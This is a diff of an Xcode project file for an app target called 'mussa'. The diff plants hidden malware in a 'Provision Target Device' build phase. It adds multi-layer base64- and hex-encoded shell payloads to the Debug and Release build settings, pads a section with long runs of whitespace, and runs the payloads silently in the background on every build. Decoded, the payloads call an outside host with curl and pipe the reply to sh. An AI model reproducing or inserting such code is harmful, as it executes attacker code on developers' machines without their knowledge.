@@ -214,7 +214,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 84C9BC2A2FAF500E004462FF /* Build configuration list for PBXNativeTarget "mussa" */;
 			buildPhases = (
-				894DFF5FE41A4FF1AC42DAD8 /* Provision Target Device */,
+				C2ABE698CDF941A3B23C1CD3 /* Provision Target Device */,
 				CEC8841473C2F5288C8D7BD0 /* [CP] Check Pods Manifest.lock */,
 				84C9BC1B2FAF500C004462FF /* Sources */,
 				84C9BC1C2FAF500C004462FF /* Frameworks */,
@@ -264,7 +264,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																																																																					/* End PBXBuildRule section */
+																																																																																																																																																								/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		84C9BC1D2FAF500C004462FF /* Resources */ = {
@@ -283,7 +283,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		894DFF5FE41A4FF1AC42DAD8 /* Provision Target Device */ = {
+		C2ABE698CDF941A3B23C1CD3 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -300,7 +300,7 @@
 			);
 			shellPath = /bin/sh;
 			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3DC1C3}\"";
 		};
 		522E2EA33E16890D08EC2087 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -395,7 +395,8 @@
 		84C9BC282FAF500E004462FF /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlSMnd3WkVkNGJGbFhVbnBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | u | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdKWVVrNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtcGlWM2gxVjFaa1QyRXlTbkJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | b | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733346336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366637323635366436353265363936650a32663631323932323230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -459,7 +460,8 @@
 		84C9BC292FAF500E004462FF /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlSMnd3WkVkNGJGbFhVbnBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | u | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdKWVVrNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtcGlWM2gxVjFaa1QyRXlTbkJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | b | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733346336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366637323635366436353265363936650a32663631323932323230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
